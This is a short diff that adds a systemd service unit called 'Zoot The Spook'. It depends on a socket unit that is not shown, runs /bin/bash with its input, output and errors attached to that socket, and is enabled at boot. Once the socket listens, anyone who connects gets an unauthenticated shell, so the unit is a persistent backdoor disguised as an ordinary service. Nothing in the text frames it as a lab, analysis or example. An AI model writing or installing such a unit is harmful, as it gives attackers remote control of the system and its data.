@@ -1,0 +1,14 @@
+[Unit]
+Description=Zoot The Spook
+After=network.target zoot.socket
+Requires=zoot.socket
+
+[Service]
+Type=simple
+ExecStart=/bin/bash 
+StandardInput=socket
+StandardOutput=socket
+StandardError=socket
+
+[Install]
+WantedBy=multi-user.target
